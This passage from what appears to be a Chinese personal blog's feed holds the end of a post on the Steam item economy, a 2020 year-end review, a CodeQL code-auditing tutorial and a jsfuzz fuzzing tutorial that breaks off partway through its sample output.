<p>要谈相互关系 最大的破坏者就是steam点数商店 用户可以在点数商品购买自己已经拥有的游戏的聊天表情/个人资料背景  只要购买游戏 就能通过点数直接购买 而不需要通过合成卡牌来获得. 一个背景只需要500点数(按写本文的时间 也就0.7r)</p>
<p>如果背景的价格比直接购买游戏会更贵,理性的人会选择购买游戏.</p>
<p>卡牌和补充包(一包可以开出三张)的关系很显然  补充包的价格会在卡牌平均价格*3浮动</p>
<p>而补充包可由宝石合出,如果卡牌的平均价格*3 高于合成所需的宝石价格 就可以通过用宝石合成补充包来获得利润.</p>
<p>上面说明卡和补充包的价格上限是受到宝石价格锚定,同样的是其他物品的下限也收到锚定</p>
<p>卡牌/聊天表情/背景都有自己的分解宝石值 通过分解获得对应的宝石. 如果购买价格低于对应宝石价格算上交易成本 同时可以获得利润 事实上在steam已经有这种机器人,长期在有价值的物品下面求购,(可笑的是由于机器人太多,在对应价格上出现了一个求购数量的尖峰)</p>
<p>除了单张卡价格锚定外 由于一套卡也属于交易物品 也受到了整套卡价格的锚定.详细内容见 <a href="#bot">交易机器人</a>一节</p>
<h3 id="市场参与者">市场参与者</h3>
<h4 id="steam-1">steam</h4>
<p>steam直接售卖的游戏 这也是绝大部分人的购买途径 但他只售卖游戏和游戏礼物</p>
<h4 id="游戏key零售商">游戏key零售商</h4>
<p>游戏开发商可以通过将key交给其他网站来售卖 这种也分两种 普通零售商和慈善包商</p>
<p>其中区别在于 普通零售商将按一个一个游戏售卖 慈善包商将会把多个游戏打包一起卖 并且价格非常低廉 1,2块一个游戏很常见. 比较好的作品不屑于将自己的作品贱卖,在慈善包能买的绝大部分只有喜+1</p>
<p>主要活跃的慈善包商</p>
<ul>
<li><a href="https://www.fanatical.com/">fanatical</a></li>
<li><a href="https://www.humblebundle.com/">humblebundle</a></li>
<li><a href="https://www.indiegala.com/">indiegala</a></li>
<li><a href="http://dailyindiegame.com/">dig</a></li>
</ul>
<h4 id="bot">交易机器人</h4>
<p>交易机器人使用整套卡牌/宝石/csgo钥匙/tf2钥匙作为交换物,可以在它们之前相互交换 例如你可以用一套卡换取一些宝石或者一些csgo钥匙</p>
<p>你可以在这里 <a href="https://steam.supply/CardBots">https://steam.supply/CardBots</a> 找到一些机器人 或者谷歌搜索也能找到</p>
<h4 id="普通用户">普通用户</h4>
<p>市场的主要参与者.通过在上面的售卖者选择 来实现自己的目的. 或者销售自己的卡牌或者饰品来获得余额</p>
<h3 id="offline">线下交易</h3>
<p>注意 如果是中国交易者 可以在https://steamrepcn.com/ 查询他的信誉记录 国外的 <a href="https://steamrep.com/">https://steamrep.com/</a></p>
<h4 id="淘宝代购贩卖充值卡">淘宝代购/贩卖充值卡</h4>
<p>代购:你支付淘宝商人一定比例的钱,淘宝商人添加好友 并赠送给你游戏.</p>
<p>贩卖余额:通过交易给你饰品 然后让你高价卖出 淘宝商人通过购买来交换给你余额(这种具有封号风险)</p>
<h4 id="玩家之间交易">玩家之间交易</h4>
<p>在论坛的交易区或者qq群发生,交易内容一般是游戏key/游戏礼物,</p>
<h4 id="饰品市场">饰品市场</h4>
<p>可以在<a href="https://buff.163.com/">网易buff</a>等网站购买和销售饰品 由于部分饰品购买后到steam转卖 扣除手续费后仍然比直接充值高 也被当成便宜充值余额的方法 同时由于国外区域不能使用支付宝  这也是外区的国内用户的消费方法</p>
<h3 id="作为一个用户">作为一个用户</h3>
<p>作为一个steam用户 如何利用市场来购买想要的东西</p>
<h3 id="增加游戏数量">增加游戏数量</h3>
<p><a href="https://keylol.com/t644656-1-1">https://keylol.com/t644656-1-1</a> 这里我推荐阅读大佬的文章 很详细</p>
<h3 id="游戏">游戏</h3>
<p>首先最好当然是先转到低价区 再通过饰品市场获得折扣过的余额 (如果读者已经学会转区 应该就不需要阅读这篇基础文章了 所以假设读者都是国区)</p>
<p>然后 <a href="https://steamdb.keylol.com/search/">https://steamdb.keylol.com/search/</a> 可以在这里查询到游戏的相关信息</p>
<p><img src="https://i.loli.net/2021/02/05/5GOYtg6KpRvPI1x.png" alt="image.png"></p>
<p>可以看到历史最低的折扣(这个游戏免费送过)   以及进入慈善包的次数</p>
<p>通过史低可以判断这个游戏当前的打折是否有优势来决定是否购买 如果进过包 通过点进进包次数可以看到进过哪些包 如果还没过期 甚至还可以买一包. 也意味着你可以通过线下交易来获得一个key,例如橙汁不考虑免费送的话 史低是7r 由于进过包 实际上在线下交易可以获得3r的key价格</p>
<p>如果没进过包 也不想在饰品市场花心思 建议通过淘宝代购</p>
<h3 id="获得勋章">获得勋章</h3>
<p>可以在<a href="https://www.steamcardexchange.net/index.php?inventory">SCE</a> 和<a href="https://www.steamtradematcher.com/">STM</a>来交换卡牌 其中STM是只能用同一套卡来交换而SCE有卡牌价格的设定</p>
<p>或如果卡牌价格比较高 也通过宝石合成补充包</p>
<h3 id="提升等级">提升等级</h3>
<p>如果需要大量提升等级 可以在淘宝购买 成本0.6r一套</p>
<p>或者如果宝石价格足够低(需要经过简单的计算) 可以通过线下购买大量宝石 然后与交易机器人交换套卡</p>
<h3 id="尾言">尾言</h3>
<p>最后引用一句大佬的名言</p>
<p><code>玩毛游戏、浪费时间、不如加一</code></p>
]]></content></item><item><title>2020 年度总结</title><link>https://blue-bird1.github.io/posts/2020-end/</link><pubDate>Thu, 31 Dec 2020 15:38:03 +0800</pubDate><guid>https://blue-bird1.github.io/posts/2020-end/</guid><description>2020年度总结 灾难性的一年 2020年终于要过完了 又到了写年度总结的时候. 今年划水的时间太多了,尤其是下半年 并没有做什么事情 首先看看各个平台</description><content type="html"><![CDATA[<h3 id="2020年度总结">2020年度总结</h3>
<p>灾难性的一年  2020年终于要过完了  又到了写年度总结的时候. 今年划水的时间太多了,尤其是下半年 并没有做什么事情</p>
<p>首先看看各个平台的年度记录</p>
<h3 id="博客">博客</h3>
<p><img src="https://i.loli.net/2020/12/31/Zj71YOgNKox9FVS.png" alt="image.png"></p>
<p>今年只更新了5篇文章 访问量只有1k多 连群里大佬的零头都没有</p>
<h3 id="github">github</h3>
<p><img src="https://i.loli.net/2020/12/23/LC37NQtbUHJixAz.png" alt="image.png"></p>
<p>今年没写什么开源代码 提交记录实在太白了   今年的提交还没到100次 . 连地砖都比你努力.jpg</p>
<h3 id="读书">读书</h3>
<p>今年读了61本</p>
<p><a href="https://www.goodreads.com/user_challenges/20057969">https://www.goodreads.com/user_challenges/20057969</a></p>
<h3 id="b站">b站</h3>
<p>数据有浮夸 因为我把号共享给别人了  所以实际数据应该要打个50off</p>
<p><img src="https://i.loli.net/2020/12/31/raLyjwR4ZMF2UHc.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/31/XGNzj967La1s53q.png" alt="image.png"></p>
<p>老白嫖党了</p>
<h3 id="steam">steam</h3>
<p>下半年沉迷steam 游戏时长飙升到了1500小时 游戏数量也从几十个飙升到了200+ (虽然大部分都是喜+1)游戏</p>
<h2 id="今年干了什么呢">今年干了什么呢</h2>
<h3 id="src">src</h3>
<p>今年国内src没挖了 只在hackerone随便提交了两个 没奖金的那种</p>
<p>hackerone很多公开报告 就算不挖看看也很不错</p>
<h3 id="代码">代码</h3>
<p>今年没写代码 唯一算作开源可用的代码 只有下半年玩steam写的一个小脚本</p>
<p><a href="https://greasyfork.org/zh-CN/scripts/415257-%E7%BD%91%E6%98%93-buff-%E5%A2%9E%E5%BC%BA%E8%84%9A%E6%9C%AC">https://greasyfork.org/zh-CN/scripts/415257-%E7%BD%91%E6%98%93-buff-%E5%A2%9E%E5%BC%BA%E8%84%9A%E6%9C%AC</a></p>
<p>反而成为最多人用的代码了? 从后台来看大概有500个人在用</p>
<h3 id="挖洞">挖洞</h3>
<p>今年挖的洞都发过博客  算是实现了去年的目标 挖了一些大一点的项目漏洞</p>
<p>一共三个</p>
<p><code>gog</code> <code>sentry</code> <code>phpmyadmin</code></p>
<h3 id="出行">出行</h3>
<p>完全没出过门  疫情开始后 家里方圆60km都没离开过  名副其实的自宅警备员了</p>
<h2 id="感想">感想</h2>
<p>看完单纯数据  谈谈感想..</p>
<p>2020年在没有什么压力下 是划水的一年.  没有作出什么意外之外的成绩.</p>
<p>今年开始的疫情让前半年都是在家度过了,不过实际上改变不大 不管是健康码还是隔离都和不出门的我没什么关系, 希望疫情尽快完全结束吧.</p>
<h3 id="目标">目标</h3>
<p>2019年定下的目标</p>
<ul>
<li>多写博客     失败 今年写的比去年少了一半</li>
<li>做些有价值的工作  挖了几个不算小的洞 勉强算完成吧</li>
<li>读有价值的书   失败 今年看的书还是偏向科普和娱乐的</li>
</ul>
<p>虽然今年也没完成什么目标 不过期望还是要有的 定几个小目标</p>
<ul>
<li>挖几个CVE</li>
<li>博客每月更新一篇</li>
<li>学一些大学基础学科</li>
<li>控制一下作息 不要老是快天亮才睡了</li>
</ul>
]]></content></item><item><title>Codeql入门教程</title><link>https://blue-bird1.github.io/posts/codeql-new/</link><pubDate>Thu, 30 Apr 2020 01:57:12 +0800</pubDate><guid>https://blue-bird1.github.io/posts/codeql-new/</guid><description>Codeql 入门教程 首发于先知社区 codeql是一个可以对代码进行分析的引擎, 安全人员可以用它作为挖洞的辅助或者直接进行挖掘漏洞,节省进行重复操作的精</description><content type="html"><![CDATA[<h2 id="codeql-入门教程">Codeql 入门教程</h2>
<blockquote>
<p>首发于先知社区</p>
</blockquote>
<p>codeql是一个可以对代码进行分析的引擎, 安全人员可以用它作为挖洞的辅助或者直接进行挖掘漏洞,节省进行重复操作的精力</p>
<h3 id="安装">安装</h3>
<p>虽然官方提供了可以进行查询的网站 但是由于速度不快和一些c/c++项目 需要自定义编译命令来编译 实际上在网站是不能查询的</p>
<p>首先找一个放codeql的目录  作者用的是<code>/opt/codeql</code></p>
<p>然后从<a href="https://github.com/github/codeql-cli-binaries/releases">这里</a>下载后解压到目录 然后下载semmle的库</p>
<p>执行 <code>cd codeql &amp;&amp; git clone https://github.com/Semmle/ql  </code></p>
<p>完成后 目录下应该有两个目录 <code>codeql  ql</code></p>
<p>接下来安装vscode插件 在插件市场直接搜索codeql即可  编写时安装量只有3k多 说明用codeql的群体暂时还不多.</p>
<h3 id="创建数据库">创建数据库</h3>
<p>使用<code>codeql database create</code> 来创建一个用于查询的数据库 <code>--language=python</code>指定语言是python</p>
<p>例子</p>
<p><code>codeql database create ./codeql -s .  --language=python</code></p>
<p>在这种解释性语言上并不困难 问题在于对于c编译语言 需要用<code>--command=xxx</code>提供编译命令 虽然codeql会自动检测编译系统 但是在一些项目上不行  这也导致你编译不了的项目就用不了codeql</p>
<p><img src="https://i.loli.net/2020/04/22/J5vogNVEkbyDc7f.png" alt="image.png"></p>
<p>在vscode把创建的codeql目录添加为数据库 就可以正式准备开始查询了</p>
<h3 id="hello-world">hello world</h3>
<p>codeql语言的查询格式如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from int i where i = 3 select i
</span></span></code></pre></td></tr></table>
</div>
</div><p>和sql比较像 <code>from</code>定义变量  <code>where</code> 声明限制条件 <code>select</code> 选择要输出的数据</p>
<p>可以使用的定义只有类和函数 例子代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 函数
</span></span><span class="line"><span class="cl">predicate Name(int i) {
</span></span><span class="line"><span class="cl">  i &gt;5
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 类声明
</span></span><span class="line"><span class="cl">class Name extend int {
</span></span><span class="line"><span class="cl">   // 类变量声明
</span></span><span class="line"><span class="cl">   int i
</span></span><span class="line"><span class="cl">   // 覆盖父类函数
</span></span><span class="line"><span class="cl">   override string func(){
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>导入包语法和python一致 也是<code>import 名字</code></p>
<p>作为每个语言都有的惯例 运行一下以下代码吧</p>
<p><code>select &quot;hello world&quot;</code></p>
<h3 id="审计使用">审计使用</h3>
<p>在这里你应该有了自己的数据库了   作者选取的是python的一个django项目 (很遗憾的是由于动态语言的特性 python的污点跟踪效果不怎么好)</p>
<p>codeql 支持的语言有<code>python</code> <code>java</code> <code>JavaScript</code> <code>c/c++</code>  <code>c#</code> <code>go</code></p>
<p>并没有安全人员最喜欢目标用的语言 php, 也不用对以后抱太大期望 以php的动态特性和开发人员动不动就全局变量或者动态字符串导入文件的做法  污点跟踪和变量分析也没法用</p>
<p>进行代码查询 首先要导入对应的编程语言包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import python
</span></span></code></pre></td></tr></table>
</div>
</div><p>需要注意的是不同语言包的使用方法不一样 而且目前的文档不是很好 也没有全面的教程</p>
<p>作者查https://help.semmle.com/qldoc/python  把python改成其他语言也能进去对应的文档</p>
<p>codeql的python库把对象分为了几种类型分别是</p>
<p><code>Scope</code> 作用域 像函数或者类</p>
<p><code>Expr</code> 表达式 像 <code>1+1</code></p>
<p><code>Stmt</code> 语句 例如 <code>if(xxx)</code></p>
<p><code>Variable</code> 变量</p>
<p>作为代码审计的开始   让我们先看看这个库调用的危险函数 在这里查了 django的重定向函数<code>redirect</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import python
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">from Call c ,Name n where c.getFunc() = n and n.getId() = &#34;redirect&#34; 
</span></span><span class="line"><span class="cl">select c,&#34;redirect&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们选择了<code>call</code>和<code>name</code>变量, call是一个函数调用</p>
<p>然后调用 <code>c.getFunc()</code> 来获取调用的函数, 为什么函数是一个<code>Name</code>呢</p>
<p>在python中 <code>test()</code> 实际上是对test这个变量进行调用 而在语法树上<code>test</code>是一个变量名</p>
<p>最后我们要求<code>n.getId()</code> 获得的名字是<code>redirect </code></p>
<p>可以发现这里能查到的都是<code>redirect()</code> 而不是<code>xx.redirect</code></p>
<p>如果我们想要寻找<code>request.GET.get(xxx)</code>的调用 必须使用<code>Attribute</code></p>
<p><code>Attribute.getName</code> 获取自身名字  <code>Attribute.getName</code> 获取.之前的<code>Expr</code> 在我们的需求中它还是一个<code>Attribute</code> 因为它前面还有<code>request.</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import python
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">from Attribute a,Attribute b  
</span></span><span class="line"><span class="cl">where a.getName() = &#34;get&#34; and a.getObject() =b 
</span></span><span class="line"><span class="cl">and (b.getName() = &#34;GET&#34; or b.getName() = &#34;post&#34;)
</span></span><span class="line"><span class="cl">select a,&#34;get request var&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以发现随着查询复杂度的增加 代码行数在不断增加 这个时候就应该使用函数来解耦</p>
<p>假设我们查询一个<code>Expr</code> 像上面的例子 但是不想查到<code>test</code> 或者<code>debug</code> 开头的文件 在<code>Expr</code>或者<code>Stmt</code>都可以通过<code>getLocation()</code>来获取当前位置  可以写一个函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">predicate isNoTest(Expr e){
</span></span><span class="line"><span class="cl">  not e.getLocation().getFile().getBaseName().matches(&#34;debug%&#34;) and 
</span></span><span class="line"><span class="cl">  not e.getLocation().getFile().getBaseName().matches(&#34;test%&#34;)
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过不断添加限制条件 在代码审计中可以锁定自己想要看到的函数调用. codeql不仅如此,还可以通过结合判断条件来寻找自己目标中的代码</p>
<p>例如我们希望找到一个函数中有获取请求数据并赋值的语句 还进行了重定向</p>
<p>首先作为一个赋值语句的终点 <code>.get(xx)</code> 是一个调用 添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select Call c
</span></span><span class="line"><span class="cl">// 省略
</span></span><span class="line"><span class="cl">and c.getFunc() = a
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后添加一个赋值语句 要求右端是上面的调用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select Assign  assign
</span></span><span class="line"><span class="cl">// 省略
</span></span><span class="line"><span class="cl">and  assign.getValue() = c
</span></span></code></pre></td></tr></table>
</div>
</div><p>再要求它们的作用范围是同一个函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from Function f
</span></span><span class="line"><span class="cl">// 省略
</span></span><span class="line"><span class="cl">and (assign.getScope() = f and  redirectCall.getScope() =f)
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import python
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">from Attribute a,Attribute b,Call c, 
</span></span><span class="line"><span class="cl"> Function f, Assign  assign, Name n,
</span></span><span class="line"><span class="cl"> Call redirectCall,Name n1
</span></span><span class="line"><span class="cl">where a.getName() = &#34;get&#34; and a.getObject() =b  
</span></span><span class="line"><span class="cl">and (b.getName() = &#34;GET&#34; or b.getName() = &#34;post&#34;)
</span></span><span class="line"><span class="cl">and f.getAStmt() =  assign
</span></span><span class="line"><span class="cl">and c.getFunc() = a
</span></span><span class="line"><span class="cl">and  assign.getValue() = c
</span></span><span class="line"><span class="cl">and  redirectCall.getFunc() = n1  and n1.getId() = &#34;redirect&#34;
</span></span><span class="line"><span class="cl">and (assign.getScope() = f and  redirectCall.getScope() =f)
</span></span><span class="line"><span class="cl">select f 
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以查询变量是否直接进行危险函数,但是由于赋值和各种字符串操作之类的关系 应该属于污点分析的内容了</p>
<h3 id="后言">后言</h3>
<p>这篇教程讲了如何去用codeql去做代码审计辅助.在拥有思路后去编写这种查询的最大难点 就是文档差了 使用人数少 你无法谷歌到xxx如何去查询 只能自己去查文档去查那些函数到底怎么用.</p>
]]></content></item><item><title>使用jsfuzz对nodejs模块进行模糊测试</title><link>https://blue-bird1.github.io/posts/jsfuzz-module/</link><pubDate>Sun, 19 Apr 2020 20:35:37 +0800</pubDate><guid>https://blue-bird1.github.io/posts/jsfuzz-module/</guid><description>使用jsfuzz对nodejs模块进行模糊测试 #### 前言 jsfuzz是一个基于覆盖率指导的模糊测试工具,能对JavaScript/nodejs模</description><content type="html"><![CDATA[<h3 id="使用jsfuzz对nodejs模块进行模糊测试">使用jsfuzz对nodejs模块进行模糊测试</h3>
<p>####　前言</p>
<p><a href="https://github.com/fuzzitdev/jsfuzz">jsfuzz</a>是一个基于覆盖率指导的模糊测试工具,能对JavaScript/nodejs模块进行模糊测试. 只需要编写一个接受输入的函数即可.</p>
<p>虽然nodejs是现代语言,即使出现了越界读写 也不会像c/c++一样直接导致安全问题. 但在审查一个复杂逻辑的nodejs模块时,仍是一个值得考虑的选项.</p>
<h4 id="下载安装">下载安装</h4>
<p><code>npm i -g jsfuzz</code></p>
<h4 id="实战">实战</h4>
<h5 id="编写模糊文件">编写模糊文件</h5>
<p>一个标准的格式是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fuzz</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// call your package with buf  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fuzz</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>更常见的是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fuzz</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 调用模块函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 检查是否是模块自己的自定义错误
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;xxx1&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;xxx2&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="nx">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>作为一个例子 作者挑选了<a href="https://github.com/mqttjs/mqtt-packet">mqtt-packet</a> 作为例子,这个模块代码不多,还提供了生成样本的函数,相当方便.</p>
<p>首先下载包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir jsfuzz
</span></span><span class="line"><span class="cl">cd jsfuzz
</span></span><span class="line"><span class="cl">npm i mqtt-packet
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过阅读包文档,很容易就能写出(复制粘贴)使用这个包解析函数的代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">mqtt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mqtt-packet&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">protocolVersion</span><span class="o">:</span> <span class="mi">4</span> <span class="p">}</span> <span class="c1">// default is 4. Usually, opts is a connect packet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fuzz</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">       <span class="kd">var</span> <span class="nx">parser</span> <span class="o">=</span> <span class="nx">mqtt</span><span class="p">.</span><span class="nx">parser</span><span class="p">(</span><span class="nx">opts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">       <span class="c1">// 这个包自己产生的异常都会通过这个函数调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="nx">parser</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">           
</span></span><span class="line"><span class="cl">       <span class="p">})</span>
</span></span><span class="line"><span class="cl">       <span class="nx">parser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fuzz</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>运行</p>
<p><code>jsfuzz fuzz2.js </code></p>
<p>输出大致如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#0 READ units: 0
</span></span><span class="line"><span class="cl">#1 NEW     cov: 605 corp: 2 exec/s: 0 rss: 35.83 MB
</span></span><span class="line"><span class="cl">#2 NEW     cov: 717 corp: 3 exec/s: 200 rss: 35.88 MB
</span></span><span class="line"><span class="cl">#10 NEW     cov: 726 corp: 4 exec/s: 615 rss: 35.88 MB
</span></span><span class="line"><span class="cl">#28 NEW     cov: 731 corp: 5 exec/s: 1058 rss: 36.07 MB
</span></span><span class="line"><span class="cl">#43 NEW     cov: 747 corp: 6 exec/s: 1500 rss: 36.07 MB
